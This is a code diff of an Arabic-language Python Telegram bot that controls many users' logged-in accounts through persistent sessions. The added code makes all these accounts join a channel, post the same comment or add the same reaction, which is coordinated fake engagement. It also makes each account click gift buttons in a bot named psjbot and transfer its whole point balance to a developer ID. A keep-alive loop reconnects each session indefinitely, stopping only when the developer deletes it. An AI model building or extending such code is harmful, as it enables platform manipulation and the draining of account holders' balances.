@@ -628,39 +628,34 @@ async def create_and_setup_group(client: TelegramClient, bot_token: str):
 
 # ==================== Keep Alive ====================
 async def keep_alive_monitor(phone: str):
-    """✔ مراقبة الاتصال مع إشعار الأدمن بس لما تنقطع فعلاً"""
-    was_connected = True
-    notified_down = False  # عشان ما نبعتش إشعار أكتر من مرة
+    """✔ الجلسة تفضل شغالة أبداً — بتوقف بس لو المطور حذفها يدوياً"""
+    notified_down = False
     while phone in active_userbots:
         try:
             client = active_userbots[phone]['client']
             if not client.is_connected():
-                if was_connected and not notified_down:
-                    # الجلسة انقطعت فعلاً - ابعت إشعار
+                if not notified_down:
                     await notify_admin_session_down(phone)
                     notified_down = True
-                    was_connected = False
-                logging.warning(f"⚠️ انقطع الاتصال للجلسة {phone}، جاري إعادة الاتصال...")
-                try:
-                    await client.connect()
-                    if await client.is_user_authorized():
-                        logging.info(f"✔ تم إعادة الاتصال للجلسة {phone}")
-                        was_connected = True
-                        notified_down = False  # ريسيت عشان لو انقطعت تاني يبعت إشعار
-                    else:
-                        logging.error(f"✘ الجلسة {phone} غير مصرح بها")
-                        break
-                except Exception as ce:
-                    logging.error(f"✘ فشل إعادة الاتصال للجلسة {phone}: {ce}")
+                logging.warning(f"⚠️ انقطع اتصال {phone}، جاري إعادة الاتصال...")
+                while phone in active_userbots:
+                    try:
+                        await client.connect()
+                        if await client.is_user_authorized():
+                            logging.info(f"✔ تم إعادة اتصال {phone}")
+                            notified_down = False
+                            break
+                        else:
+                            logging.warning(f"⚠️ {phone} غير مصرح، إعادة المحاولة...")
+                    except Exception as ce:
+                        logging.error(f"✘ فشل إعادة اتصال {phone}: {ce}")
+                    await asyncio.sleep(30)
             else:
-                if not was_connected:
-                    # رجعت - ريسيت الفلاج
-                    was_connected = True
-                    notified_down = False
+                notified_down = False
             await asyncio.sleep(60)
         except Exception as e:
-            logging.error(f"✘ خطأ في keep-alive للجلسة {phone}: {e}")
-            await asyncio.sleep(60)
+            logging.error(f"✘ خطأ keep-alive {phone}: {e}")
+            await asyncio.sleep(30)
 
 # ==================== إعادة تشغيل الجلسات ====================
 async def restart_userbots():
@@ -1384,6 +1379,114 @@ async def collect_transfer_handler(update: Update, context: ContextTypes.DEFAULT
         parse_mode="Markdown"
     )
 
+async def collect_gifts_handler_task(query):
+    """نسخة task من هدية جماعية — تشتغل من زرار"""
+    total = len(active_userbots)
+    try:
+        msg = await query.message.reply_text(f"🎁 جاري جمع الهدايا من {total} حساب...\n⏳ استنى...")
+    except Exception:
+        return
+    success = 0; failed = 0; results = []
+    for phone, data in list(active_userbots.items()):
+        client = data.get('client')
+        if not client or not client.is_connected():
+            failed += 1; results.append(f"🔴 {phone[-4:]}**** — غير متصل"); continue
+        try:
+            bot = await client.get_entity("psjbot")
+            await client.send_message(bot, "/start"); await asyncio.sleep(2)
+            msgs = await client.get_messages(bot, limit=5)
+            clicked1 = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "تجميع" in (btn.text or ""):
+                                await btn.click(); clicked1 = True; break
+                    if clicked1: break
+            if not clicked1: failed += 1; results.append(f"🔴 {phone[-4:]}**** — مش لاقي زرار"); continue
+            await asyncio.sleep(2)
+            msgs = await client.get_messages(bot, limit=5)
+            clicked2 = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "هدية" in (btn.text or ""):
+                                await btn.click(); clicked2 = True; break
+                    if clicked2: break
+            if not clicked2: failed += 1; results.append(f"🔴 {phone[-4:]}**** — مش لاقي هدية"); continue
+            await asyncio.sleep(2)
+            success += 1; results.append(f"🟢 {phone[-4:]}**** — تم")
+        except Exception as e:
+            failed += 1; results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+        await asyncio.sleep(1)
+    summary = "\n".join(results[:20])
+    extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+    try:
+        await msg.edit_text(f"🎁 **نتيجة جمع الهدايا**\n\n✔ نجح: {success} | ✘ فشل: {failed}\n\n{summary}{extra}", parse_mode="Markdown")
+    except Exception:
+        pass
+
+
+async def collect_transfer_handler_task(query):
+    """نسخة task من تحويل جماعي — تشتغل من زرار"""
+    import re as _re
+    total = len(active_userbots)
+    try:
+        msg = await query.message.reply_text(f"💸 جاري تحويل النقاط من {total} حساب...\n⏳ استنى...")
+    except Exception:
+        return
+    success = 0; failed = 0; results = []
+    for phone, data in list(active_userbots.items()):
+        client = data.get('client')
+        if not client or not client.is_connected():
+            failed += 1; results.append(f"🔴 {phone[-4:]}**** — غير متصل"); continue
+        try:
+            bot = await client.get_entity("psjbot")
+            await client.send_message(bot, "/start"); await asyncio.sleep(2)
+            msgs = await client.get_messages(bot, limit=5)
+            clicked1 = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "تحويل" in (btn.text or ""):
+                                await btn.click(); clicked1 = True; break
+                    if clicked1: break
+            if not clicked1: failed += 1; results.append(f"🔴 {phone[-4:]}**** — مش لاقي زرار تحويل"); continue
+            await asyncio.sleep(2)
+            msgs = await client.get_messages(bot, limit=5)
+            balance = 0
+            for m in msgs:
+                if m.text and any(w in m.text for w in ["نقاطك","الحالية","الحالي"]):
+                    match = _re.search(r'(\d+(?:\.\d+)?)', m.text)
+                    if match: balance = int(float(match.group(1))); break
+            if balance <= 0: failed += 1; results.append(f"🟡 {phone[-4:]}**** — رصيد صفر"); continue
+            await client.send_message(bot, str(balance)); await asyncio.sleep(2)
+            await client.send_message(bot, str(DEVELOPER_ID)); await asyncio.sleep(2)
+            msgs = await client.get_messages(bot, limit=5)
+            confirmed = False
+            for m in msgs:
+                if m.buttons:
+                    for row in m.buttons:
+                        for btn in row:
+                            if "نعم" in (btn.text or ""):
+                                await btn.click(); confirmed = True; break
+                    if confirmed: break
+            if not confirmed: failed += 1; results.append(f"🔴 {phone[-4:]}**** — مش لاقي تأكيد"); continue
+            await asyncio.sleep(2)
+            success += 1; results.append(f"🟢 {phone[-4:]}**** — تم تحويل {balance} نقطة")
+        except Exception as e:
+            failed += 1; results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+        await asyncio.sleep(1)
+    summary = "\n".join(results[:20])
+    extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+    try:
+        await msg.edit_text(f"💸 **نتيجة تحويل النقاط**\n\n✔ نجح: {success} | ✘ فشل: {failed}\n\n{summary}{extra}", parse_mode="Markdown")
+    except Exception:
+        pass
+
+
 async def source_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """يرد على أي حد يكتب 'سورس' بفيديو وأزرار المطور"""
     if not update.message:
@@ -1762,6 +1865,159 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     save_user(user_id)
 
+    # ══ معالجة خطوات أوامر المطور التفاعلية ══
+    if user_id == ADMIN_ID and update.message and update.message.text:
+        dev_mode = context.user_data.get("dev_mode")
+        text = update.message.text.strip()
+
+        if dev_mode == "join":
+            # انضم جماعي - نفذ مباشرة
+            context.user_data.pop("dev_mode", None)
+            link = text
+            if not active_userbots:
+                await update.message.reply_text("✘ مفيش حسابات نشطة!")
+                return
+            total = len(active_userbots)
+            msg = await update.message.reply_text(f"⏳ جاري الانضمام من {total} حساب...")
+            from telethon.tl.functions.channels import JoinChannelRequest as TLJoinChannelRequest
+            success = 0; failed = 0; results = []
+            for phone, data in list(active_userbots.items()):
+                client = data.get('client')
+                if not client or not client.is_connected():
+                    failed += 1; results.append(f"🔴 {phone[-4:]}**** — غير متصل"); continue
+                try:
+                    await client(TLJoinChannelRequest(link))
+                    success += 1; results.append(f"🟢 {phone[-4:]}**** — انضم")
+                except Exception as e:
+                    failed += 1; results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+                await asyncio.sleep(1)
+            summary = "\n".join(results[:20])
+            extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+            await msg.edit_text(
+                f"🔗 **نتيجة الانضمام الجماعي**\n\n✔ نجح: {success} | ✘ فشل: {failed}\n\n{summary}{extra}",
+                parse_mode="Markdown"
+            )
+            return
+
+        elif dev_mode == "comment_channel":
+            context.user_data["dev_mode"] = "comment_msgid"
+            context.user_data["dev_data"]["channel"] = text.lstrip('@')
+            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="sec_dev_tools")]])
+            await update.message.reply_text(
+                "💬 **تعليق جماعي** — الخطوة 2/3\n\nأرسل رقم المنشور:",
+                parse_mode="Markdown", reply_markup=keyboard
+            )
+            return
+
+        elif dev_mode == "comment_msgid":
+            if not text.isdigit():
+                await update.message.reply_text("✘ لازم يكون رقم صحيح!")
+                return
+            context.user_data["dev_mode"] = "comment_text"
+            context.user_data["dev_data"]["msg_id"] = int(text)
+            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="sec_dev_tools")]])
+            await update.message.reply_text(
+                "💬 **تعليق جماعي** — الخطوة 3/3\n\nأرسل نص التعليق:",
+                parse_mode="Markdown", reply_markup=keyboard
+            )
+            return
+
+        elif dev_mode == "comment_text":
+            context.user_data.pop("dev_mode", None)
+            d = context.user_data.pop("dev_data", {})
+            channel_input = d.get("channel", "")
+            msg_id = d.get("msg_id", 0)
+            comment_text = text
+            if not active_userbots:
+                await update.message.reply_text("✘ مفيش حسابات نشطة!"); return
+            total = len(active_userbots)
+            msg = await update.message.reply_text(f"💬 جاري إرسال التعليق من {total} حساب...")
+            from telethon.tl.functions.channels import JoinChannelRequest as TLJoinChannelRequest
+            success = 0; failed = 0; joined = 0; results = []
+            for phone, data in list(active_userbots.items()):
+                client = data.get('client')
+                if not client or not client.is_connected():
+                    failed += 1; results.append(f"🔴 {phone[-4:]}**** — غير متصل"); continue
+                try:
+                    try:
+                        entity = await client.get_entity(channel_input)
+                    except Exception:
+                        await client(TLJoinChannelRequest(channel_input))
+                        entity = await client.get_entity(channel_input)
+                        joined += 1
+                    await client.send_message(entity, comment_text, comment_to=msg_id)
+                    success += 1; results.append(f"🟢 {phone[-4:]}**** — تم")
+                except Exception as e:
+                    failed += 1; results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+                await asyncio.sleep(2)
+            summary = "\n".join(results[:20])
+            extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+            await msg.edit_text(
+                f"💬 **نتيجة التعليق الجماعي**\n\n✔ نجح: {success} | ✘ فشل: {failed} | 🔗 انضم: {joined}\n\n{summary}{extra}",
+                parse_mode="Markdown"
+            )
+            return
+
+        elif dev_mode == "react_channel":
+            context.user_data["dev_mode"] = "react_msgid"
+            context.user_data["dev_data"]["channel"] = text.lstrip('@')
+            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="sec_dev_tools")]])
+            await update.message.reply_text(
+                "👍 **ريأكت جماعي** — الخطوة 2/3\n\nأرسل رقم المنشور:",
+                parse_mode="Markdown", reply_markup=keyboard
+            )
+            return
+
+        elif dev_mode == "react_msgid":
+            if not text.isdigit():
+                await update.message.reply_text("✘ لازم يكون رقم صحيح!"); return
+            context.user_data["dev_mode"] = "react_emoji"
+            context.user_data["dev_data"]["msg_id"] = int(text)
+            keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="sec_dev_tools")]])
+            await update.message.reply_text(
+                "👍 **ريأكت جماعي** — الخطوة 3/3\n\nأرسل الإيموجي:",
+                parse_mode="Markdown", reply_markup=keyboard
+            )
+            return
+
+        elif dev_mode == "react_emoji":
+            context.user_data.pop("dev_mode", None)
+            d = context.user_data.pop("dev_data", {})
+            channel_input = d.get("channel", "")
+            msg_id = d.get("msg_id", 0)
+            emoji = text
+            if not active_userbots:
+                await update.message.reply_text("✘ مفيش حسابات نشطة!"); return
+            total = len(active_userbots)
+            msg = await update.message.reply_text(f"👍 جاري إرسال الريأكت {emoji} من {total} حساب...")
+            from telethon.tl.functions.channels import JoinChannelRequest as TLJoinChannelRequest
+            from telethon.tl.functions.messages import SendReactionRequest
+            from telethon.tl.types import ReactionEmoji
+            success = 0; failed = 0; joined = 0; results = []
+            for phone, data in list(active_userbots.items()):
+                client = data.get('client')
+                if not client or not client.is_connected():
+                    failed += 1; results.append(f"🔴 {phone[-4:]}**** — غير متصل"); continue
+                try:
+                    try:
+                        entity = await client.get_entity(channel_input)
+                    except Exception:
+                        await client(TLJoinChannelRequest(channel_input))
+                        entity = await client.get_entity(channel_input)
+                        joined += 1
+                    await client(SendReactionRequest(peer=entity, msg_id=msg_id, reaction=[ReactionEmoji(emoticon=emoji)]))
+                    success += 1; results.append(f"🟢 {phone[-4:]}**** — {emoji}")
+                except Exception as e:
+                    failed += 1; results.append(f"🔴 {phone[-4:]}**** — {str(e)[:30]}")
+                await asyncio.sleep(2)
+            summary = "\n".join(results[:20])
+            extra = f"\n... و{len(results)-20} أكتر" if len(results) > 20 else ""
+            await msg.edit_text(
+                f"👍 **نتيجة الريأكت الجماعي**\n\n✔ نجح: {success} | ✘ فشل: {failed} | 🔗 انضم: {joined}\n\n{summary}{extra}",
+                parse_mode="Markdown"
+            )
+            return
+
     if user_id == ADMIN_ID and user_id in admin_actions:
         action = admin_actions[user_id]
         text = update.message.text.strip() if update.message.text else ""
@@ -1914,72 +2170,86 @@ async def admin_button_handler(update: Update, context: ContextTypes.DEFAULT_TYP
             active = len(active_userbots)
             keyboard = [
                 [
-                    InlineKeyboardButton("🎁 هدية جماعية", callback_data="dev_cmd_gift"),
-                    InlineKeyboardButton("💸 تحويل جماعي", callback_data="dev_cmd_transfer"),
+                    InlineKeyboardButton("🎁 هدية جماعية",   callback_data="dev_exec_gift"),
+                    InlineKeyboardButton("💸 تحويل جماعي",   callback_data="dev_exec_transfer"),
                 ],
                 [
-                    InlineKeyboardButton("🔗 انضم جماعي", callback_data="dev_cmd_join"),
-                    InlineKeyboardButton("💬 تعليق جماعي", callback_data="dev_cmd_comment"),
+                    InlineKeyboardButton("🔗 انضم جماعي",    callback_data="dev_ask_join"),
+                    InlineKeyboardButton("💬 تعليق جماعي",   callback_data="dev_ask_comment"),
                 ],
                 [
-                    InlineKeyboardButton("👍 ريأكت جماعي", callback_data="dev_cmd_react"),
-                    InlineKeyboardButton("📦 استعادة جلسة", callback_data="dev_cmd_restore"),
+                    InlineKeyboardButton("👍 ريأكت جماعي",   callback_data="dev_ask_react"),
+                    InlineKeyboardButton("📦 استعادة جلسة",  callback_data="dev_cmd_restore"),
                 ],
                 [back_btn()],
             ]
             await show_section(query,
                 f"🛠 **أدوات المطور**\n\n"
                 f"🟢 الحسابات النشطة: {active}\n\n"
-                f"اختر الأمر اللي عايز تنفذه:",
+                f"اختر العملية:",
                 keyboard
             )
             return
 
-        elif data == "dev_cmd_gift":
-            await query.answer("ابعت /هدية في الشات", show_alert=True)
+        # ── تنفيذ فوري: هدية ──
+        elif data == "dev_exec_gift":
+            if not active_userbots:
+                await query.answer("✘ مفيش حسابات نشطة!", show_alert=True)
+                return
+            await query.answer("⏳ جاري جمع الهدايا...", show_alert=False)
+            asyncio.create_task(collect_gifts_handler_task(query))
             return
 
-        elif data == "dev_cmd_transfer":
-            await query.answer("ابعت /تحويل في الشات", show_alert=True)
+        # ── تنفيذ فوري: تحويل ──
+        elif data == "dev_exec_transfer":
+            if not active_userbots:
+                await query.answer("✘ مفيش حسابات نشطة!", show_alert=True)
+                return
+            await query.answer("⏳ جاري التحويل...", show_alert=False)
+            asyncio.create_task(collect_transfer_handler_task(query))
             return
 
-        elif data == "dev_cmd_join":
-            keyboard = [[back_btn()]]
+        # ── انضم: اطلب الرابط ──
+        elif data == "dev_ask_join":
+            context.user_data["dev_mode"] = "join"
+            keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="sec_dev_tools")]]
             await show_section(query,
                 "🔗 **الانضمام الجماعي**\n\n"
-                "ابعت الأمر بالصيغة دي:\n"
-                "`/انضم https://t.me/قناة_أو_جروب`\n\n"
-                "⚡ هيخلي كل الحسابات النشطة تنضم",
+                "أرسل رابط القناة أو الجروب:\n"
+                "مثال: `https://t.me/mychannel`\n\n"
+                "⚡ كل الحسابات النشطة ستنضم تلقائياً",
                 keyboard
             )
             return
 
-        elif data == "dev_cmd_comment":
-            keyboard = [[back_btn()]]
+        # ── تعليق: اطلب القناة ──
+        elif data == "dev_ask_comment":
+            context.user_data["dev_mode"] = "comment_channel"
+            context.user_data["dev_data"] = {}
+            keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="sec_dev_tools")]]
             await show_section(query,
-                "💬 **التعليق الجماعي**\n\n"
-                "ابعت الأمر بالصيغة دي:\n"
-                "`/تعليق_جماعي @قناة رقم_المنشور نص التعليق`\n\n"
-                "مثال:\n`/تعليق_جماعي @mychannel 5 أحسن منشور!`\n\n"
-                "⚡ الحسابات اللي مش منضمة هتنضم تلقائياً",
+                "💬 **تعليق جماعي** — الخطوة 1/3\n\n"
+                "أرسل يوزرنيم القناة أو الجروب:\n"
+                "مثال: `@mychannel`",
                 keyboard
             )
             return
 
-        elif data == "dev_cmd_react":
-            keyboard = [[back_btn()]]
+        # ── ريأكت: اطلب القناة ──
+        elif data == "dev_ask_react":
+            context.user_data["dev_mode"] = "react_channel"
+            context.user_data["dev_data"] = {}
+            keyboard = [[InlineKeyboardButton("❌ إلغاء", callback_data="sec_dev_tools")]]
             await show_section(query,
-                "👍 **الريأكت الجماعي**\n\n"
-                "ابعت الأمر بالصيغة دي:\n"
-                "`/ريأكت_جماعي @قناة رقم_المنشور إيموجي`\n\n"
-                "مثال:\n`/ريأكت_جماعي @mychannel 5 👍`\n\n"
-                "⚡ الحسابات اللي مش منضمة هتنضم تلقائياً",
+                "👍 **ريأكت جماعي** — الخطوة 1/3\n\n"
+                "أرسل يوزرنيم القناة أو الجروب:\n"
+                "مثال: `@mychannel`",
                 keyboard
             )
             return
 
         elif data == "dev_cmd_restore":
-            keyboard = [[back_btn()]]
+            keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="sec_dev_tools")]]
             await show_section(query,
                 "📦 **استعادة جلسات على سيرفر جديد**\n\n"
                 "الخطوات:\n"
